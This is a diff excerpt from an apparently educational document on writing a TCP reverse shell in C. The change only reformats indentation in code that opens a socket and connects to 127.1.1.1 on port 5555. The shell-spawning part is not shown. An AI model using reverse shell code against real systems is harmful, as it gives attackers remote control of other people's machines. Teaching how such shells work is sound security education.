@@ -32,19 +32,19 @@ An example of a TCP reverse shell in C can be found below. This example has been
 int main(int argc, int *argv[])
 {
     int s;
-	struct sockaddr_in addr;
+    struct sockaddr_in addr;
 	
     // set "addr.sin_family" to IPV4
-	addr.sin_family = AF_INET;
-	// set the port number to 5555
-	addr.sin_port = htons(5555);
-	// when executed the code will connect to 127.1.1.1
-	addr.sin_addr.s_addr = inet_addr("127.1.1.1");
+    addr.sin_family = AF_INET;
+    // set the port number to 5555
+    addr.sin_port = htons(5555);
+    // when executed the code will connect to 127.1.1.1
+    addr.sin_addr.s_addr = inet_addr("127.1.1.1");
 
     // Create the socket
-	// AF_INET for IPv4
-	// SOCK_STREAM for TCP connection
-	s = socket(AF_INET, SOCK_STREAM, 0);
+    // AF_INET for IPv4
+    // SOCK_STREAM for TCP connection
+    s = socket(AF_INET, SOCK_STREAM, 0);
 
     // Connect to the remote machine
     connect(s, (struct sockaddr *)&addr, sizeof(addr));
